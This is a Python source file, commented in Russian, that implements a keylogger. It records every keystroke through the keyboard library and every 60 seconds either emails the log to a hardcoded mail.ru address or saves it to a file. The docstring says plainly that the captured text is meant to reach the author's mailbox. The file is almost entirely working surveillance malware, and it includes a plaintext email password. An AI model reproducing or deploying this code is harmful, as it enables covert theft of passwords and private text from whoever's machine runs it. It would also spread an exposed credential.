
"""
юзер вводит текст, он записывается в файл
через какое-то время, он отправляется мне на почту
1) pip install keyboard
2) запись в файл через with as
3) SMTP - pip install smtplib
4) threading -> Timer
"""

import keyboard
import smtplib
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60 # время в секундах для отправки на почту

# для работы с отправкой почты
EMAIL_ADDRESS = "shibanovivanxai@mail.ru"
EMAIL_PASSWORD = "lFTyY2QLkX"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        # сюда будут записаны логи
        self.log = ""
        # начало и конец записи
        self.start_date = datetime.now()
        self.end_date = datetime.now()

    # дописать обработку shift
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def update_filename(self):
        # создать имя файла из даты начала и окончания записи
        start_dt_str = str(self.start_date)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_date)[:-7].replace(" ", "-").replace(":", "")

        self.filename = f"log -{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}", "w", encoding='utf-8') as f:
            print(self.log, file=f)
        print(f"[+] SAVED {self.filename}.txt")

    def sendmail(self, email, password, message):
        # подключение к серверу по SMTP
        server = smtplib.SMTP(host="smtp.mail.ru", port=465)
        # подключаемся в режиме TLS
        server.starttls()
        # авторизация
        server.login(email, password)
        # отправка
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.end_date = datetime.now()
            # обн. имя файла
            self.update_filename()
            if self.report_method == 'email':
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()

            self.start_date = datetime.now()
        self.log = " "
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_date = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == '__main__':
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()

